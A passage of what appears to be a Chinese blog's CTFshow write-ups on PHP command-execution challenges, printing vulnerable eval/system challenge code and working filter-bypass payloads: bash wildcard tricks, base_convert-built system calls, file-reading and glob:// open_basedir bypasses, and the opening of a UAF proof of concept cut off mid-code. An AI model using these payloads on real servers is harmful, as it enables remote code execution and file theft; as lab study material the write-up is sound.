class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>比上一题过滤更加严密，把<code>FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME</code>都过滤掉了。<br>好像把<code>$&#123;PWD&#125;</code>留下了。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">code=<span class="variable">$</span>&#123;<span class="built_in">PWD</span>::<span class="variable">$</span>&#123;<span class="comment">#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;#?&#125;&#125;?? ????.???</span></span><br><span class="line"></span><br><span class="line">/???/<span class="built_in">r</span>?? ????.???</span><br><span class="line">/bin/rev</span><br></pre></td></tr></table></figure><p><code>$&#123;?&#125;=0，$&#123;#?&#125;=1</code>中(<code>$?</code>是表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误)<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681313098244-77c8ab4a-3462-446c-a5e6-dda6f36c5048.png" alt="image.png"><br>在本地调转一下即可：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681313310818-b3f49950-e3bc-4b9b-bdad-3b3494168abb.png" alt="image.png"></p><h2 id="和"><a href="#和" class="headerlink" title="${?}和$?"></a>${?}和$?</h2><blockquote><p><a href="https://www.cnblogs.com/chengd/p/7803664.html">https://www.cnblogs.com/chengd/p/7803664.html</a></p></blockquote><h1 id="web122"><a href="#web122" class="headerlink" title="web122"></a>web122</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\&gt;|\&#x27;</span>|\<span class="string">&quot;|\`|\||\,/&#x27;, <span class="variable">$code</span>))&#123;    </span></span><br><span class="line"><span class="string">        if(strlen(<span class="variable">$code</span>)&gt;65)&#123;</span></span><br><span class="line"><span class="string">            echo &#x27;&lt;div align=&quot;</span>center<span class="string">&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        else&#123;</span></span><br><span class="line"><span class="string">        echo &#x27;&lt;div align=&quot;</span>center<span class="string">&quot;&gt;&#x27;.system(<span class="variable">$code</span>).&#x27;&lt;/div&gt;&#x27;;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    else&#123;</span></span><br><span class="line"><span class="string">     echo &#x27;&lt;div align=&quot;</span>center<span class="string">&quot;&gt;evil input&lt;/div&gt;&#x27;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>PWD这回也没了。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=&lt;A;<span class="variable">$</span>&#123;HOME::<span class="variable">$</span>?&#125;???<span class="variable">$</span>&#123;HOME::<span class="variable">$</span>?&#125;?????<span class="variable">$</span>&#123;RANDOM::<span class="variable">$</span>?&#125; ????.???</span><br></pre></td></tr></table></figure><p>一般情况下<code>#RANDOM</code>返回的值为4或5.<br>因此这个是概率触发。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681314039095-ad8c4a2b-4193-4cb8-9cb9-ec532b413d90.png" alt="image.png"><br>base64解密：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681314066321-4698fa50-eab6-4ff7-acd7-da64bee136ac.png" alt="image.png"><br>在末尾补一个<code>&#125;</code>即可。</p><h1 id="web124"><a href="#web124" class="headerlink" title="web124"></a>web124</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: 收集自网络</span></span><br><span class="line"><span class="comment"># @Date:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2020-10-06 14:04:45</span></span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="line"><span class="keyword">if</span>(!isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    //例子 c=<span class="number">20</span><span class="literal">-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        die(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;</span><span class="string">&#x27;, &#x27;</span><span class="string">&quot;&#x27;, &#x27;`&#x27;, &#x27;\[&#x27;, &#x27;\]&#x27;];</span></span><br><span class="line"><span class="string">    foreach (<span class="variable">$blacklist</span> as <span class="variable">$blackitem</span>) &#123;</span></span><br><span class="line"><span class="string">        if (preg_match(&#x27;/&#x27; . <span class="variable">$blackitem</span> . &#x27;/m&#x27;, <span class="variable">$content</span>)) &#123;</span></span><br><span class="line"><span class="string">            die(&quot;</span>请不要输入奇奇怪怪的字符<span class="string">&quot;);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line"><span class="string">    <span class="variable">$whitelist</span> = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;];</span></span><br><span class="line"><span class="string">    preg_match_all(&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span></span><br><span class="line"><span class="string">    foreach (<span class="variable">$used_funcs</span>[0] as <span class="variable">$func</span>) &#123;</span></span><br><span class="line"><span class="string">        if (!in_array(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span></span><br><span class="line"><span class="string">            die(&quot;</span>请不要输入奇奇怪怪的函数<span class="string">&quot;);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    //帮你算出答案</span></span><br><span class="line"><span class="string">    eval(&#x27;echo &#x27;.<span class="variable">$content</span>.&#x27;;&#x27;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>不能有特殊字符，不能有除whitelist里面的字母，大概思路就是利用进制转换以数字构造字母<br>题中可用的进制转换函数：<code>&#39;base_convert&#39;, &#39;bindec&#39;,&#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="type">abs</span>](<span class="variable">$_GET</span>[<span class="type">acos</span>])//strlen(<span class="variable">$content</span>) &gt;= <span class="number">80</span>，有长度限制，所以利用get命令执行</span><br><span class="line">↓</span><br><span class="line"><span class="variable">$_GET</span>&#123;abs&#125;(<span class="variable">$_GET</span>&#123;acos&#125;)//[]在黑名单，用&#123;&#125;代替</span><br><span class="line">↓</span><br><span class="line"><span class="variable">$pi</span>=_GET;<span class="variable">$</span><span class="variable">$pi</span>&#123;abs&#125;(<span class="variable">$</span><span class="variable">$pi</span>&#123;acos&#125;)</span><br><span class="line">↓</span><br><span class="line">进制转换</span><br><span class="line">base_convert(number,frombase,tobase)：在任意进制之间转换数字</span><br><span class="line">dechex()：把十进制数转换为十六进制数</span><br><span class="line">hex2bin()：把十六进制值的字符串转换为二进制，返回 ASCII 字符</span><br><span class="line">最重要的是hex2bin函数，但是不在白名单里面</span><br><span class="line"></span><br><span class="line">base_convert构造hex2bin（我想用base_convert直接转_GET，但是只能得到get）</span><br><span class="line">base_convert(<span class="string">&#x27;hex2bin&#x27;</span>,<span class="number">36</span>,<span class="number">10</span>)→<span class="number">37907361743</span></span><br><span class="line">_GET→  hex十六进制 <span class="number">5</span>f474554 (不能有字母所以十六进制不行) →  dec十进制 <span class="number">1598506324</span>(在线转换)</span><br><span class="line"></span><br><span class="line">所以_GET可以写为</span><br><span class="line">hex2bin(dechex(<span class="number">1598506324</span>))</span><br><span class="line">↓</span><br><span class="line">base_convert(<span class="string">&#x27;37907361743&#x27;</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>))</span><br><span class="line"></span><br><span class="line">最后的payload</span><br><span class="line">?c=<span class="variable">$pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));<span class="variable">$</span><span class="variable">$pi</span>&#123;abs&#125;(<span class="variable">$</span><span class="variable">$pi</span>&#123;acos&#125;)&amp;abs=system&amp;acos=<span class="built_in">ls</span></span><br><span class="line">?c=<span class="variable">$pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));<span class="variable">$</span><span class="variable">$pi</span>&#123;abs&#125;(<span class="variable">$</span><span class="variable">$pi</span>&#123;acos&#125;)&amp;abs=system&amp;acos=<span class="built_in">cat</span> *</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681316055871-f13664ad-be4d-43df-ba7c-d4fb99564492.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web58-77命令执行篇（三）</title>
      <link href="/2023/04/13/web58-77%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87%EF%BC%88%E4%B8%89%EF%BC%89/"/>
      <url>/2023/04/13/web58-77%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87%EF%BC%88%E4%B8%89%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正常来说，看到这个格式，我们第一个想到的就是使用system然后命令执行，但是当我们尝试使用时会发现：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680188042126-c8349447-3fd5-476b-9f44-6882c1d58843.png" alt="image.png"><br>这是因为php.ini配置中默认禁用了执行系统外部命令函数，但是这里我们可以用php内置函数来读取文件，因此这部分学习的时php相关函数的使用。<br>我们需要先查看当前目录。<code>c=print_r(glob(&quot;*&quot;));</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680188390551-ccd0bc7e-f319-48f4-9048-e9709fe4a367.png" alt="image.png"><br>或者<code>c=print_r(scandir(&#39;.&#39;));</code>（注意两者的返回数组内容不同）<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680188668314-11508ec5-a9c6-4805-a743-2b89641beb78.png" alt="image.png"><br>我们直接显示代码就行。<br>post传参，<code>c=highlight_file(&#39;flag.php&#39;);</code>或者<code>show_source(__FILE__);</code></p><h1 id="web59-65"><a href="#web59-65" class="headerlink" title="web59-65"></a>web59-65</h1><p>题可能出错了，和58一模一样…</p><h1 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>show_source被禁用，highlight_file查看flag.php文件提示不在这里。<br>那么查看根目录文件发现flag.txt。<code>c=var_dump(scandir(&#39;/&#39;));</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680189387199-0ce00bd0-0d23-44e5-a511-2f3e9b96f24b.png" alt="image.png"><br>直接用highlight_file读文件。<code>c=highlight_file(&#39;/flag.txt&#39;);</code></p><h1 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h1><p>禁用了print_r<br><code>var_dump(scandir(&#39;/&#39;));</code><br><code>c=highlight_file(&#39;/flag.txt&#39;);</code></p><h1 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h1><p>把highlight_file禁用了。但是其他的还可以用。<br><code>var_dump(scandir(&#39;/&#39;));</code>查看根目录文件。<br>我们还可以使用include、require函数来阅读文件：<code>require(&#39;/flag.txt&#39;);</code></p><h1 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h1><p>var_dump被禁用，但是google了一下类似函数，发现了<code>var_export</code>函数功能类似。<br><code>c=var_export(scandir(&#39;/&#39;));</code><br>读取根目录下文件。<code>require(&#39;/flag.txt&#39;);</code></p><h1 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h1><p><code>c=var_export(scandir(&#39;/&#39;));</code><br><code>require(&#39;/flag.txt&#39;);</code></p><h1 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h1><p>尝试读取根目录：<code>c=var_export(scandir(&#39;/&#39;));</code>但是发现出现如下情况：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680191189835-ec426ee9-4d83-4d74-b321-79bbe39b0de7.png" alt="image.png"><br>经过查询发现，这是php对缓冲区进行操作导致的。</p><blockquote><p><a href="https://blog.csdn.net/weixin_39938855/article/details/115944594">https://blog.csdn.net/weixin_39938855/article/details/115944594</a></p></blockquote><p>查看index.php后发现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>原理就是ob_get_contents()和ob_end_clean();的执行，我们想办法让他后面的部分不执行即可，那么我们对payload后面加上<code>exit(0)</code>截断即可（或者die函数）<br><code>c=var_export(scandir(&#39;/&#39;));die(1);</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680191595296-540d251d-7abb-47f6-9f07-1ea8ef6685b7.png" alt="image.png"><br>这样文本就正常了。<br><code>require(&#39;/flag.txt&#39;);</code></p><h1 id="web72"><a href="#web72" class="headerlink" title="*web72"></a>*web72</h1><p>scandir函数被禁止了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>让我们看看wp是怎么解的吧。（水平一下又拔起来了。。。）<br>利用php脚本读取文件目录：（利用glob://伪协议绕过open_basedir）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>这是访问根目录，如果想要访问网站目录为（相对路径）：</strong><code>**&quot;glob://./*&quot;**</code><br>因为scandir这些简单函数被禁用了，就需要我们手写函数来输出。<br>发现目录下有flag0.txt，那么直接尝试require来读取。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680271902026-3d23f6a9-a78f-4a2f-a7c2-7e5ed8084dc7.png" alt="image.png"><br>但是发现这些读取函数被禁用了，没有读取权限。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680271990810-7fa1a783-940b-48f6-8ef4-f07133f5c45e.png" alt="image.png"><br>uaf绕过open_basedir执行命令<br>poc（需要url编码）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span 